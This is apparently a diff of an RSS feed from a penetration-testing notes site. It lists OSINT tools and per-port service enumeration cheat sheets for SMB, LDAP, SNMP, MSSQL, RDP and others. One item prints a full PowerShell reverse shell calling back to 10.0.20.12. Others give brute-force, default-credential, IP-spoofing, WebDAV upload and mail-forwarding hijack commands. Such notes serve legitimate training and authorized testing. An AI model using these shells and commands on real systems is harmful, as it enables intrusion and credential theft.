+      <description>Metagoofil # Extracting metadata of public documents (pdf,doc,xls,ppt,etc) availables in the target websites # The tool first perform a query in Google requesting different filetypes that can have useful metadata (pdf, doc, xls,ppt,etc) # Then will download those documents to the disk and extracts the metadata of the file using specific libraries for # parsing different file types (Hachoir, Pdfminer, etc) # Options # -d: domain to search # -t: filetype to download (pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx) # -l: limit of results to search (default 200) # -h: work with documents in directory (use \&amp;#34;yes\&amp;#34; for local analysis) # -n: limit of files to download # -o: working directory (location to save downloaded files) # -f: output file metagoofil.</description>
+    </item>
+    
+    <item>
+      <title>Windows Shells Methods</title>
+      <link>/shells-methods/windows/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/shells-methods/windows/</guid>
+      <description>Powershell # Powershell reverse shell # Scheduled task for example # powershell -enc &amp;lt;base 64 de la commande&amp;gt; $client = New-Object System.Net.Sockets.TCPClient(&amp;#34;10.0.20.12&amp;#34;,443);$stream = $client.GetStream();\ [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\ $sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + &amp;#34;PS &amp;#34; + (pwd).Path + &amp;#34;&amp;gt; &amp;#34;;\ $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\ $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() WMIexec # wmiexec is less noisy than psexec /usr/bin/impacket-wmiexec d.</description>
+    </item>
+    
+    <item>
+      <title>119 - NTP</title>
+      <link>/recon-enumeration/services-enumeration/119_nntp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/119_nntp/</guid>
+      <description> Banner Grabbing # Using telnet telnet IP 119 # Using netcat nc -nv IP 119 LIST 
+Identification and manual test # Using netcat nc -nv IP 119 LIST GROUP group_name to display related messages POST From; test@knacki.fr Newsgroups: group_name Subject: Test This is a test. . HEAD identity_article ARTICLE identity_article BODY identity_article</description>
+    </item>
+    
+    <item>
+      <title>MISC &amp; Others</title>
+      <link>/web-attacks/misc_others/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/misc_others/</guid>
+      <description>Table of Content  MISC Hidden Parameters Command Injection Server Side Template Injection (SSTI) Image Tragick Shellshock Heartbleed  
+MISC # Install files # You can check for backup files using the following extensions .backup, .bck, .old, .save, .bak, .sav, ~, .copy, .old, .orig, .tmp, .txt, .back, .bkp, .bac, .tar, .gz, .tar.gz, .zip, .rar # Check headers # They often give informations curl -v &amp;lt;target&amp;gt; # Test for others HTTP methods (verb tampering) # Bypass .</description>
+    </item>
+    
+    <item>
+      <title>Photon</title>
+      <link>/open-source-intelligence-osint/technical-recon/photon/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/photon/</guid>
+      <description>General Informations # Photon is a fast OSINT web crawler which can retrieve the following data for a target : # URLs (in-scope &amp;amp; out-of-scope) # URLs with parameters (example.com/gallery.php?id=2) # Intel (emails, social media accounts, amazon buckets etc.) # Files (pdf, png, xml etc.) # Secret keys (auth/API keys &amp;amp; hashes) # JavaScript files &amp;amp; Endpoints present in them # Strings matching custom regex pattern # Subdomains &amp;amp; DNS related data # You can use the --ninja 4 option to get 4 clients requesting server.</description>
+    </item>
+    
+    <item>
+      <title>ReconDog</title>
+      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/recondog/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/recondog/</guid>
+      <description>General Informations # Recon Dog is an all in one tool for all your basic information gathering needs. # It uses APIs to gather all the information so your identity is not exposed. # Simple and basic standalone python script # All informations seems to be extracted from API&amp;#39;s services, so it fully passive 
+Modules &amp;amp; Tools • Censys: uses censys.io to collect a large amount of information about an IP address • NS Lookup: Performs name server search • Port scan: Scans the most common TCP ports • Detect CMS: Can detect more than 400 content management systems • Whois Lookup: Performs whois protocol search • Detect honeypot: Uses Shodan to identify whether the target is a honeypot • Find subdomains: Search for sub-domains using com • Reverse IP Lookup: Does an inverse IP lookup to find domains associated with an IP address • Detect technologies: Uses wappalyzer.</description>
+    </item>
+    
+    <item>
+      <title>135 - RPC</title>
+      <link>/recon-enumeration/services-enumeration/135_rpc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/135_rpc/</guid>
+      <description>Resources http://attackerkb.com/Windows/rpcclient rpcclient # Anonymous connection (-N=no pass) rpcclient -U “” -N &amp;lt;ip&amp;gt; # Connection with user rpcclient -U “user” &amp;lt;ip&amp;gt; # Get information about the DC srvinfo # Get information about objects such as groups (enum*) enumdomains enumdomgroups enumalsgroups builtin # Try to get domain password policy getdompwinfo # Try to enumerate different truste domains dsr_enumtrustdom # Get username for a defined user ? getusername # Query user, group etc informations queryuser RID querygroupmem519 queryaliasmem builtin 0x220 # Query info policy lsaquery # Convert SID to names lookupsids SID</description>
+    </item>
+    
+    <item>
+      <title>MISC</title>
+      <link>/open-source-intelligence-osint/technical-recon/misc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/misc/</guid>
+      <description>Orbit - Cryto Wallet Analysis # Give it a blockchain based crypto wallet address and it will crawl 3 levels deep in transaction data to plot a graph out of the information. python3 orbit.py # Next thing is to plot a graph for which we will be using quark framework # Then use the html output python quark.py /path/to/file.json 
+Wayback Machine (https://archive.org/web/) # You can also uses as CLI tool https://github.</description>
+    </item>
+    
+    <item>
+      <title>OSINT-SPY</title>
+      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/osint-spy/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/osint-spy/</guid>
+      <description>General Informations # Performs OSINT scan on email/domain/ip_address/organization using OSINT-SPY. # It can be used by Data Miners, Infosec Researchers, Penetration Testers and cyber crime # investigator in order to find deep information about their target. # Perform scan on IP Address / domain / email address / BTC(bitcoin) address / device # Find out latest bitcoin block information # List out all the ciphers supported by particular website and server # Check whether a particular website is vulnerable to heartbleed or not ?</description>
+    </item>
+    
+    <item>
+      <title>139/445 - SMB</title>
+      <link>/recon-enumeration/services-enumeration/139_445_smb/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/139_445_smb/</guid>
+      <description>General Informations SMB1 =&amp;gt; Win2000 / XP / 2003 SMB2.0 =&amp;gt; Vista / 2008 SMB2.1 =&amp;gt; Win7 / 2008R2 SMB3.0 =&amp;gt; Win8 / 2012 SMB 3.02 =&amp;gt; Win8.1 / 2012R2 # Configuration tips # Can be usefull to configure /etc/samba/smb.conf with: client min protocol = SMB2 client max protocol = SMB3 # Then service smbd restart 
+Identification # Port 139 # Using nbtscan to identify host/domain nbtscan IP (identifier le nom/domaine) # Identity SMB2 support using metasploit use auxiliary/scanner/smb/smb2 set RHOST IP run # Discover real samba version if hidden ngrep -i -d tap0 ‘s.</description>
+    </item>
+    
+    <item>
+      <title>Belati</title>
+      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/belati/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/belati/</guid>
+      <description>General Informations # Belati is tool for Collecting Public Data &amp;amp; Public Document from Website and other service for OSINT purpose. # This tools is inspired by Foca and Datasploit for OSINT # Might need root privileges to executes all tools # Like nmap. But it works well without root (nmap won&amp;#39;t be executed) # Not totally passive as long as it does an HTTP Banner Grabbing for earch domain/subdomain found.</description>
+    </item>
+    
+    <item>
+      <title>143 - IMAP</title>
+      <link>/recon-enumeration/services-enumeration/143_imap/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/143_imap/</guid>
+      <description> Identification and Scans # Nmap scan nmap -v -sV --version-intensity=5 --script imap-capabilities -p T:143 &amp;lt;IP&amp;gt; # Banner grabbing telnet &amp;lt;IP&amp;gt; 143 # Banner grabbing and test connection nc -nv IP 143 A1 LOGIN “root” “” A1 LOGIN root toor A1 LOGIN root root</description>
+    </item>
+    
+    <item>
+      <title>161/162 - SNMP</title>
+      <link>/recon-enumeration/services-enumeration/161_162_snmp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/161_162_snmp/</guid>
+      <description>Resources https://blog.cedrictemple.net/239-faire-des-requetes-snmp-en-ligne-de-commande-sous-linux/ 
+Identification &amp;amp; Scans nmap -vv -sV --version-intensity=5 -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes IP 
+Snmpwalk snmpwalk -c public -v1 IP 1 &amp;gt; snmpwalk.txt Windows RUNNING PROCESSES 1.3.6.1.2.1.25.4.2.1.2 Windows INSTALLED SOFTWARE 1.3.6.1.2.1.25.6.3.1.2 Windows SYSTEM INFO 1.3.6.1.2.1.1.1 Windows HOSTNAME 1.3.6.1.2.1.1.5 Windows DOMAIN 1.3.6.1.4.1.77.1.4.1 Windows UPTIME 1.3.6.1.2.1.1.3 Windows USERS 1.3.6.1.4.1.77.1.2.25 Windows SHARES 1.3.6.1.4.1.77.1.2.27 Windows DISKS 1.3.6.1.2.1.25.2.3.1.3 Windows SERVICES 1.3.6.1.4.1.77.1.2.3.1.1 Windows LISTENING TCP PORTS 1.3.6.1.2.1.6.13.1.3.0.0.0.0 Windows LISTENING UDP PORTS 1.3.6.1.2.1.7.5.1.2.0.0.0.0 Linux RUNNING PROCESSES 1.</description>
+    </item>
+    
+    <item>
+      <title>389/636/3269 - LDAP</title>
+      <link>/recon-enumeration/services-enumeration/389_636_3269_ldap/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/389_636_3269_ldap/</guid>
+      <description>General Informations # Ports 389 - LDAP 636 - LDAPS (SSL) 3269 - LDAP Global Catalog # Architecture (LDAP is hierarchical) - DC = Domain Component, the domain name - OU = Organizational Unit, \&amp;#34;folders - CN = Common Name, the name fiven to the objects (Username, Group name, Computer name, etc.) # Research syntax ldapsearch &amp;lt;bind options&amp;gt; -b &amp;lt;base to search from&amp;gt; &amp;lt;search filter&amp;gt; &amp;lt;attributes&amp;gt; # Interesting attributes for user class ldapsearch “(objectClass=user)” interesting attributes: - sAMAccountName - userPrincipalName - memberOf (groups) - badPwdCount (failed logins) - lastLogoff (timestamp) - lastLogon (timestamp) - pwdLastSet (timestamp) - logonCount # Interesting attributes for group class ldapsearch “(objectClass=group)” interesting attributes: - cn - member (one per user/group) - memberOf (if nested in another group) # Interesting attributes for computer class ldapsearch “(objectClass=computer)” interesting attributes: - name (NetBIOS name) - DNSHostName (FQDN) =&amp;gt; combine it with DNS lookups and you can enumerate every IP address in the domain without scanning - operatingSystem - operatingSystemVersion (patch level) - lastLogonTimestamp - servicePrincipalName (running services =&amp;gt; TERMSRV, HTTP, MSSQL)</description>
+    </item>
+    
+    <item>
+      <title>995 - POP3S</title>
+      <link>/recon-enumeration/services-enumeration/995_pop3s/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/995_pop3s/</guid>
+      <description> Identification and Scans # Retrieve POP3 server capabilities (CAPA, TOP, USER, SASL, RESP-CODES, LOGIN-DELAY, PIPELINING, EXPIRE, UIDL, IMPLEMENTATION) nmap -v -sV --version-intensity=5 --script pop3-capabilities -p T:995 IP # Try to bruteforce POP3 accounts nmap --script pop3-brute --script-args pop3loginmethod=SASL-LOGIN -p T:995 IP nmap --script pop3-brute --script-args pop3loginmethod=SASL-CRAM-MD5 -p T:995 IP nmap --script pop3-brute --script-args pop3loginmethod=APOP -p T:995 IP 
+SSL Checking # Using openssl openssl s_client -connect IP:995 
+Authentication Checking (classical credentials) USER admin PASS admin USER root PASS root USER root PASS toor</description>
+    </item>
+    
+    <item>
+      <title>1025 - NFS/IIS</title>
+      <link>/recon-enumeration/services-enumeration/1025_nfs_iis/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/1025_nfs_iis/</guid>
+      <description>Identification and Checking # Check on the Web port (80 ?): # _vti_pvt for OSCP /_vti_pvt/access.cnf /_vti_pvt/service.cnf /_vti_inf.htm 
+WebDAV Exploitation using Metasploit # Checking WebDAV using metasploit use auxiliary/scanner/http/webdav_scanner set rhosts &amp;lt;IP&amp;gt; run # Content discovery using metasploit use auxiliary/scanner/http/webdav_website_content set rhosts &amp;lt;IP&amp;gt; run # Checking authentication using metasploit use auxiliary/scanner/http/ms09_020_webdav_unicode_bypass set rhosts &amp;lt;IP&amp;gt; run # Upload exploitation using metasploit use exploit/windows/iis/iis_webdav_upload_asp 
+Manual WebDAV exploitation (cadaver) cadaver http://IP/ # Goal is to upload file on IIS Server.</description>
+    </item>
+    
+    <item>
+      <title>1433 - MSSQL</title>
+      <link>/recon-enumeration/services-enumeration/1433_mssql/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/1433_mssql/</guid>
+      <description>Identification and Scans # Using nmap NSE scripts nmap -n -sV --version-intensity=5 -sT -Pn -p T:1433 --script=xxxx &amp;lt;IP&amp;gt; # Bruteforce accounts and password against a MSSQL Server ms-sql-brute # Queries Microsoft SQL Server (ms-sql) instances for a list of databases, linked servers,and configuration settings. # Credentials required ms-sql-config # Queries the Microsoft SQL Browser service for the DAC (Dedicated AdminConnection) ms-sql-dac # Dumps the password hashes from an MS-SQL server in a format suitable # Credentials required ms-sql-dump-hashes # Attempts to authenticate to Microsoft SQL Servers using an empty password forthe sysadmin (sa) account.</description>
+    </item>
+    
+    <item>
+      <title>1721 - VPN</title>
+      <link>/recon-enumeration/services-enumeration/1721_vpn/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/1721_vpn/</guid>
+      <description>Resources https://github.com/0x90/vpn-arsenal https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/ 
+Exploitation Techniques # IKEv2 Authenthication IP spoofing ike-scan --sport=1723 --dport=1723 --sourceip=IP_To_Spoof --ikev2 &amp;lt;IP&amp;gt; # Trying all authentication modes ike-scan --dport=1723 --auth=1 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --auth=3 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --auth=64221 &amp;lt;IP&amp;gt; # IP spoofing using ike-scan ike-scan --dport=1723 --sourceip=IP_To_Spoof --auth=1 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof --auth=3 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof --auth=64221 &amp;lt;IP&amp;gt; # IP spoofing and agressive mode ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=1 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=3 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=64221 &amp;lt;IP&amp;gt; # Show fingerprint ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=1 --showbackoff &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=3 --showbackoff &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=64221 --showbackoff &amp;lt;IP&amp;gt; # Crack the key using psk-crack psk-crack hash-file.</description>
+    </item>
+    
+    <item>
+      <title>3306 - MySQL</title>
+      <link>/recon-enumeration/services-enumeration/3306_mysql/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/3306_mysql/</guid>
+      <description>Basics # Try connection from outside mysql --host &amp;lt;IP&amp;gt; -u root -proot # Connection from the target machine mysql -u root -p root database 
+Classical commands show databases; use database_name; show tables; describe table_name; select host, user, password from mysql.user; 
+Identification and Scan # Using nmap NSE scripts nmap -n -sV --version-intensity=5 -Pn -p T:3306 --script=xxxx &amp;lt;IP&amp;gt; # Audits MySQL database server security configuration mysql-audit # Bruteforce accounts and password against a MySQL Server mysql-brute # Attempts to list all databases on a MySQL server.</description>
+    </item>
+    
+    <item>
+      <title>3389 - RDP</title>
+      <link>/recon-enumeration/services-enumeration/3389_rdp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/3389_rdp/</guid>
+      <description>Identification and Scans # Using nmap NSE scripts nmap -Pn -sV --version-intensity=5 -p T:3389 --script=xxxx &amp;lt;IP&amp;gt; # Determines which Security layer and Encryption level is supported by the RDP service rdp-enum-encryption # Checks if a machine is vulnerable to MS12-020 RDP vulnerability rdp-vuln-ms12-020.nse  
+Credentials bruteforce # Using ncrack for one user ncrack -vv -u nina -P passwords.txt rdp://IP # Using ncrack for several users ncrack -vv -U users.</description>
+    </item>
+    
+    <item>
+      <title>4555 - RSIP</title>
+      <link>/recon-enumeration/services-enumeration/4555_rsip/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/4555_rsip/</guid>
+      <description>Forwarding admin&amp;rsquo;s mails # Connection through netcat (can test for creds) nc -nv &amp;lt;IP&amp;gt; 4555 # Get commands HELP # Get users (hopefully an admin?) listusers # Add user adduser haax ***REMOVED*** # Set an alias for our user setalias mailadmin haax # Set mail forwarding setforwarding mailadmin haax@lab.</description>
     </item>
     
   </channel>
